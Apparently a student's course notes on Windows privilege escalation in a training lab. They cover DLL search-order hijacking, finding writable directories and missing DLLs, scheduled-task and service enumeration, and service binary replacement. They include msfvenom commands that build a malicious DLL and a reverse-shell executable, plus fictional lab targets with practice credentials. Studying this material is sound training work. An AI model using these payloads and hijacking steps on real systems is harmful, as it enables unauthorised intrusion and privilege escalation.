Windows Exploitation:

The program checks the following registry location and will attempt to use the last known location of the DLL
    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"

If the DLL is not found the program will check the following locations, in order:
    The directory the the Application was run from
    The exact location on the hard drive where the program was executed from. Even locations such as C:\Users\Public\Downloads

    The directory specified in in the C+ function GetSystemDirectory()
    The returned location is C:\Windows\system32 even on 64 bit systems.

    The directory specified in the C+ function GetWindowsDirectory()
    The returned location should always be C:\Windows

    The current directory
    The current directory assuming the application was executed using its full path.



The program checks the following registry location and will attempt to use the last known location of the DLL
    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"


net use * http://live.sysinternals.com


use sigcheck (use -m option):
    find: asInvoker
    

Find programs that run as highest avalible for privelege escalation.


scheduled tasks:
schtasks /query /fo LIST /v

there are vulnerabilities associated with schtasks.
    look for anything running from a non-standard location. 

    Excludes results that we dont want to seein order to help narrow down vulnerable directory locations:
        schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch

CMD tool:
    icacls: USE THIS TO FIND DiRECTORIES THAT WE CAN PUT DLLs INTO!!!!
        Displays or modifies file permissions.
            icacls "c:\users\student\exercise_2"
            
Then identify DLLs we can hijack.            
open procmon,
run the program
find what dll-calls the program makes.
    
    process name is putty.exe
    path contains .dll
    result is "NAME NOT FOUND"

Now we have a good list of DLLs. 

make a payload using msfvenom:
    msfvenom -p windows/exec CMD='cmd.exe > c:\\whoami.txt' -f dll > SSPICLI.dll




VULNERABLE SERVICES

wmic service list full
sc query
GUI tool. just look for services in windows search bar.


Exploiting a vulnerable Service:
    The overall intent is to replace the legitimate service with an executable that will allow an attacker to accomplish their objective.
    (Optional) Create a malicious executable file via MSFVenom *`` msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f exe > 7z.exe

    Create a backup copy of 7z.exe
    copy 7z.exe 7z.blk.exe

    Copy a malicious executable into 7z.exe old location
    copy "c:\Users\student\setup\fetchable\networkedservice2.exe" "c:\Program Files\7-Zip\7z.exe



Dll hijacking & binary replacement are the only important things from today.




ACTIVITY NOTES=========================================


Scheme of Maneuver:
>Jump Box
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.















